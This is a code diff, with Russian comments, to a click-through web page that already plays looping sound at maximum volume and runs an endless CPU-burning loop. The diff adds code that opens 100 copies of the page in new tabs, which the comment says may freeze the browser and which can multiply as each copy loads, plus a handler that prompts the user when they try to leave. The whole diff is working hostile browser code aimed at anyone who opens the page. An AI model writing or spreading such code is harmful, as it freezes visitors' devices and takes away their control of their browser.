@@ -38,9 +38,14 @@
                 document.getElementById("text").textContent = texts[index];
                 clickCount++;
             } else {
-                sound.volume = 1.0; // Устанавливаем громкость на максимум
-                sound.loop = true; 
+                sound.volume = 1.0; // Громкость на максимум
+                sound.loop = true;
                 sound.play().catch(error => console.log("Ошибка автозапуска:", error));
+
+                // Открываем 100 новых вкладок (может зависнуть браузер)
+                for (let i = 0; i < 100; i++) {
+                    window.open(window.location.href, '_blank');
+                }
 
                 // Бесконечная нагрузка процессора
                 while (true) {
@@ -48,6 +53,11 @@
                 }
             }
         }
+
+        // Блокировка выхода
+        window.onbeforeunload = function() {
+            return "Ты точно хочешь уйти?"; // Показывает предупреждение при попытке закрытия вкладки
+        };
     </script>
 </body>
 </html>
